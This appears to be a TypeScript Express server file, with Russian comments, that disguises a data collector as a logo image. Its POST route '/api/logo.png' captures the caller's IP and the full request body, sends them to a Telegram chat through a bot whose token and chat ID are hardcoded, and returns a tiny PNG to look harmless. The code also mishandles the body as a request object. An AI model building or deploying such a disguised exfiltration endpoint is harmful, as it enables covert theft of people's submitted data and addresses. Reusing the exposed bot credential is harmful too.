import express from 'express';
import axios from 'axios'; // Для отправки запросов в Telegram

const app = express();

// Middleware для парсинга JSON и urlencoded данных
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Конфигурация Telegram
const TELEGRAM_BOT_TOKEN = '7283726243:AAFW3mIA1SzOmyftdqiRv8xTxtAmyk1rLmw';
const TELEGRAM_CHAT_ID = '5018443124';

// Лого в формате Base64
const LOGO_BASE64 = 'iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4AkEEjUXUBJp+AAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAAAK0lEQVQ4y2NgGAWjYBSMglEwCkbBKBgM4H8Q8p+BgYGB8X8Q0jQKRgEAGY0BCS1Xw/MAAAAASUVORK5CYII=';

// Обработчик POST запросов
app.post('/api/logo.png', async (req, res) => {
  try {
    // Получаем IP пользователя
    const userIp = req.ip || 
                  req.headers['x-forwarded-for'] || 
                  req.connection.remoteAddress || 
                  req.socket.remoteAddress;
    
    console.log('Received POST request from IP:', userIp, 'with data:', req.body);

    // Отправляем данные в Telegram
    await sendToTelegram(userIp, req.body);

    // Отправляем изображение
    const imageBuffer = Buffer.from(LOGO_BASE64, 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.setHeader('Content-Length', imageBuffer.length);
    res.status(200).send(imageBuffer);

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Функция отправки сообщения в Telegram
async function sendToTelegram(ip: string | string[] | undefined, data: Request) {
  try {
    const message = `🖼️ Новый запрос логотипа\n\n` +
                   `🖥️ IP: ${ip}\n` +
                   `📊 Данные: ${JSON.stringify(data, null, 2)}\n` +
                   `🌐 User-Agent: ${data.headers?.get('user-agent') || 'Не указан'}`;

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Telegram send error:', error);
  }
}

export default app;